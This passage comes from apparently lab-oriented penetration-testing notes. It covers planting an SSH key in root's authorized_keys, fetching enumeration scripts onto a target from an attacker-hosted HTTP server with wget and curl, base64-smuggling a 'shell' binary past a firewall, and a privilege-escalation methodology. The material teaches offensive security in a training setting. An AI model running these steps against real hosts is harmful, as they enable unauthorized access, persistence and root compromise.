user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:

```shell
Pwn1Sec@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```

# Transferring Files

---

During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

---

## Using wget

There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```shell
Pwn1Sec@htb[/htb]$ cd /tmp
Pwn1Sec@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```shell
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

```shell
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Note that we used the `-o` flag to specify the output file name.

---

## Using SCP

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```shell
Pwn1Sec@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.

---

## Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

```shell
Pwn1Sec@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

```shell
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

## Validating File Transfers

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

```shell
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:

```shell
Pwn1Sec@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Now, we can go to the remote server and run the same command on the file we transferred:

```shell
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

#### Checking Routing Table

Another way to check for connectivity is to use the command `sudo netstat -rn` to view our routing table:

  Checking Routing Table

```shell
Pwn1Sec@htb[/htb]$ sudo netstat -rn

[sudo] password for user: 

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         192.168.195.2   0.0.0.0         UG        0 0          0 eth0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
192.168.1.0   0.0.0.0         255.255.255.0   U         0 0          0 eth0
```

## Changing SSH Key and Password

In case we start facing some issues with connecting to SSH servers or connecting to our machine from a remote server, we may want to renew or change our SSH key and password to make sure they are not causing any issues. We can do this with the `ssh-keygen` command, as follows:

  Not Disabling Proxy

```shell
Pwn1Sec@htb[/htb]$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/parrot/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase):
Enter same passphrase again:

Your identification has been saved in /home/parrot/.ssh/id_rsa
Our public key has been saved in /home/parrot/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:...SNIP... parrot@parrot
The key's randomart image is:
+---[RSA 3072]----+
|            o..  |
|     ...SNIP     |
|     ...SNIP     |
|     ...SNIP     |
|     ...SNIP     |
|     ...SNIP     |
|     ...SNIP     |
|       + +oo+o   |
+----[SHA256]-----+
```

By default, SSH keys are stored in the `.ssh` folder within our home folder (for example, `/home/htb-student/.ssh`). If we wanted to create an ssh key in a different directory, we could enter an absolute path for the key when prompted. We can encrypt our SSH key with a password when prompted or keep it empty if we do not want to use a password.

# Finaly:
## Tips

Remember that enumeration is an iterative process. After performing our `Nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with `Nibbles`:

- Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan
    
- Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `Gobuster`
    
- If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
    
- After identifying the technologies in use, use a tool such as `Searchsploit` to find public exploits or search on Google for manual exploitation techniques
    
- After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY
    
- Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials
    
- Organize this data offline to determine the various ways to escalate privileges to root on this target
    

There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.
